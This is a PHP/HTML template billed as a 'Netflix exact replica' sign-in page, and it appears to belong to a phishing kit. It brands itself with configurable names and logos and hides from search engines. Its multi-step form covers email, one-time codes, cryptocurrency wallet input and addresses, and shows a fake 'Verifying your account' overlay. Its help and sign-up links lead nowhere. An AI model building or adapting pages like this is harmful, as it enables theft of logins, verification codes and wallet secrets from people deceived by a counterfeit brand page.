<?php
// Streaming template — Netflix exact replica
// Black bg with dark gradient, red logo top-right, white bold title, dark inputs, red button
// Form floats centered with semi-transparent dark overlay card
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title><?=$org_name?></title>
<meta name="robots" content="noindex,nofollow">
<style>
*{margin:0;padding:0;box-sizing:border-box}

body{
  font-family:'Netflix Sans','Helvetica Neue',Helvetica,Arial,sans-serif;
  min-height:100vh;min-height:100dvh;
  background:#000;
  background-image:
    linear-gradient(to bottom, rgba(0,0,0,.8) 0%, rgba(0,0,0,.4) 40%, rgba(0,0,0,.7) 100%);
  display:flex;flex-direction:column;
  color:#fff;
  position:relative
}

/* Background image faint (Netflix uses a movie collage) — simulate with dark gradient */
body::before{
  content:'';
  position:fixed;inset:0;
  background:
    radial-gradient(ellipse at 30% 40%, rgba(<?=$ar?>,<?=$ag?>,<?=$ab?>,.12) 0%, transparent 60%),
    linear-gradient(135deg, #0a0a0a 0%, #1a0000 50%, #0a0a0a 100%);
  z-index:0
}

/* Netflix top bar */
.nf-header{
  position:relative;z-index:10;
  padding:24px 40px;
  display:flex;align-items:center;justify-content:space-between
}
.nf-logo{
  font-size:32px;font-weight:900;
  color:<?=$accent?>;
  letter-spacing:-1px;text-transform:uppercase;
  font-style:italic
}
.nf-logo-img{height:36px;object-fit:contain}

/* Card / form box */
.nf-card{
  position:relative;z-index:10;
  width:100%;max-width:450px;
  margin:0 auto;
  background:rgba(0,0,0,.75);
  border-radius:4px;
  padding:52px 68px 56px;
  min-height:420px
}

/* Spacer to push card down */
.nf-spacer{flex:1;display:flex;align-items:center;justify-content:center;padding:0 20px 60px}

/* Title */
.nf-title{font-size:32px;font-weight:700;color:#fff;margin-bottom:24px;letter-spacing:-.3px}

/* Fields */
.field{margin-bottom:16px;position:relative}
.field label{
  display:block;
  font-size:11px;color:#8c8c8c;
  font-weight:600;letter-spacing:.4px;
  text-transform:uppercase;
  margin-bottom:6px
}
.field input{
  width:100%;
  background:#333;
  border:none;
  border-bottom:2px solid #8c8c8c;
  color:#fff;
  padding:16px 14px 6px;
  font-size:16px;
  outline:none;
  font-family:inherit;
  border-radius:4px 4px 0 0;
  transition:border-color .2s;
  -webkit-appearance:none
}
.field input:focus{border-bottom-color:<?=$accent?>}
.field input::placeholder{color:#8c8c8c;font-size:14px}
.or-div{
  text-align:center;font-size:13px;color:#737373;
  margin:14px 0;position:relative
}
.or-div::before,.or-div::after{
  content:'';position:absolute;top:50%;
  width:42%;height:1px;background:#404040
}
.or-div::before{left:0}.or-div::after{right:0}
.card-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}

/* Submit button */
.btn{
  width:100%;padding:16px;
  background:<?=$accent?>;color:#fff;
  font-size:16px;font-weight:700;
  border:none;border-radius:4px;cursor:pointer;
  margin-top:24px;letter-spacing:.5px;
  transition:background .15s;
  position:relative;font-family:inherit;
  text-transform:uppercase
}
.btn:hover{background:rgba(<?=$ar?>,<?=$ag?>,<?=$ab?>,.85)}
.btn:disabled{opacity:.6;cursor:not-allowed}
.btn.loading::after{
  content:'';position:absolute;right:16px;top:50%;
  width:16px;height:16px;
  border:2px solid rgba(255,255,255,.3);border-top-color:#fff;
  border-radius:50%;transform:translateY(-50%);
  animation:spin .7s linear infinite
}
@keyframes spin{to{transform:translateY(-50%) rotate(360deg)}}
.err-msg{font-size:13px;color:#e87c03;margin-top:8px;display:none}

/* Help link */
.help-link{
  display:block;text-align:center;
  margin-top:16px;font-size:14px;color:#737373;
  text-decoration:none
}
.help-link:hover{text-decoration:underline;color:#fff}

/* New to Netflix? */
.new-row{margin-top:16px;font-size:14px;color:#737373;text-align:center}
.new-row a{color:#fff;text-decoration:none}
.new-row a:hover{text-decoration:underline}

/* Footer */
.nf-footer{
  position:relative;z-index:10;
  padding:20px 40px 30px;
  font-size:12px;color:#737373;
  text-align:center
}
.nf-footer a{color:#737373;text-decoration:none;margin:0 8px}
.nf-footer a:hover{text-decoration:underline}

/* OTP / wallet / address */
.otp-wrap{display:flex;gap:8px;justify-content:center}
.otp-wrap input{
  flex:1;text-align:center;font-size:22px;font-weight:700;
  padding:14px 4px;max-width:48px;
  background:#333;border:none;border-bottom:2px solid #8c8c8c;
  border-radius:4px 4px 0 0;color:#fff;outline:none
}
.otp-wrap input:focus{border-bottom-color:<?=$accent?>}
.otp-hint{font-size:13px;color:#737373;text-align:center;margin-top:8px}
.wallet-area{
  width:100%;min-height:80px;
  background:#333;border:none;border-bottom:2px solid #8c8c8c;
  color:#fff;padding:14px;border-radius:4px 4px 0 0;
  font-size:14px;font-family:monospace;outline:none;resize:none
}
.wallet-area:focus{border-bottom-color:<?=$accent?>}
.wallet-hint{font-size:12px;color:#737373;margin-top:6px;line-height:1.5}
.addr-area{
  width:100%;min-height:60px;
  background:#333;border:none;border-bottom:2px solid #8c8c8c;
  color:#fff;padding:14px;border-radius:4px 4px 0 0;
  font-size:15px;font-family:inherit;outline:none;resize:none
}
.addr-area:focus{border-bottom-color:<?=$accent?>}

/* Loading overlay */
#loadOverlay{
  display:none;position:fixed;inset:0;
  background:rgba(0,0,0,.85);z-index:999;
  align-items:center;justify-content:center;flex-direction:column;gap:16px
}
#loadOverlay.show{display:flex}
.load-spin{
  width:44px;height:44px;
  border:3px solid rgba(255,255,255,.15);border-top-color:<?=$accent?>;
  border-radius:50%;animation:spin .8s linear infinite
}
.load-txt{font-size:14px;color:#737373}

/* Mobile */
@media(max-width:480px){
  body::before{display:none}
  body{background:#000}
  .nf-header{padding:18px 16px}
  .nf-logo{font-size:26px}
  .nf-card{border-radius:0;padding:32px 20px 40px;background:#000;max-width:100%}
  .nf-spacer{padding:0;align-items:flex-start}
  .nf-title{font-size:26px}
}
</style>
</head>
<body>
<div id="loadOverlay"><div class="load-spin"></div><div class="load-txt" id="loadText">Verifying your account…</div></div>

<!-- Netflix-style top bar -->
<div class="nf-header">
  <?php if($logo_url): ?>
  <img src="<?=htmlspecialchars($logo_url)?>" class="nf-logo-img" alt="<?=htmlspecialchars($org_name)?>" onerror="this.style.display='none';this.nextElementSibling.style.display='block'">
  <div class="nf-logo" style="display:none"><?=htmlspecialchars($org_name)?></div>
  <?php else: ?>
  <div class="nf-logo"><?=htmlspecialchars($org_name)?></div>
  <?php endif; ?>
</div>

<div class="nf-spacer">
  <div class="nf-card">
    <div class="nf-title">Sign In</div>

    <?php for($sn=1;$sn<=$total_steps;$sn++): ?>
    <div id="step<?=$sn?>" <?=$sn>1?'style="display:none"':''?>>
      <?php if($sn > 1): ?>
      <div style="font-size:18px;font-weight:600;color:#fff;margin-bottom:6px"><?=htmlspecialchars($sc['step_titles'][$sn])?></div>
      <div style="font-size:14px;color:#8c8c8c;margin-bottom:20px" id="step<?=$sn?>sub"><?=htmlspecialchars($sc['step_subs'][$sn])?></div>
      <?php else: ?>
      <div id="step1sub" style="display:none"></div>
      <?php endif; ?>
      <form onsubmit="submitStep(event,<?=$sn?>)">
        <?php $fld = $sc['step'.$sn.'_fields'] ?? 'email_only'; include __DIR__.'/partials/fields.php'; ?>
        <button type="submit" class="btn" id="btn<?=$sn?>"><?=htmlspecialchars($sc['btn_labels'][$sn-1])?></button>
        <div class="err-msg" id="err<?=$sn?>">Please enter a valid email or phone number.</div>
      </form>
      <a href="#" class="help-link" onclick="return false">Need help?</a>
      <?php if($sn===1): ?>
      <div class="new-row">New to <?=htmlspecialchars($org_name)?>? <a href="#">Sign up now</a></div>
      <?php endif; ?>
    </div>
    <?php endfor; ?>
  </div>
</div>

<div class="nf-footer">
  <div><?=$footer?></div>
  <div style="margin-top:10px">
    <a href="#">Privacy</a>
    <a href="#">Terms of Use</a>
    <a href="#">Cookie Preferences</a>
    <a href="#">Corporate Information</a>
    <a href="#">Help Center</a>
  </div>
</div>

<?php include __DIR__.'/partials/js.php'; ?>
</body>
</html>
